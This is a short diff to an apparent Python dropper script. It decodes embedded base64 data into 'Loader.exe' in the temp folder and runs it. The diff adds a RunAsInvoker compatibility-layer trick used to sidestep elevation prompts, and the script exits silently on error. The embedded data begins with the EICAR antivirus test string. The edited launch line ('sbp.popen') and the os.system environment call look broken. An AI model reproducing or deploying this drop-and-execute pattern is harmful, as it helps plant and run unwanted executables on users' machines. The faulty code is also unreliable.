@@ -9,7 +9,8 @@ b64data = b'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJV
 with open(f"{temp}\\Loader.exe","wb")as f:
     f.write(b64d(b64data))
 try:
-    subprocess.Popen(f"{temp}\\Loader.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
+    os.system('set __COMPAT_LAYER=RunAsInvoker')
+    sbp.popen(f"{temp}\\Loader.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
 except:
     sys.exit()
 sys.exit()
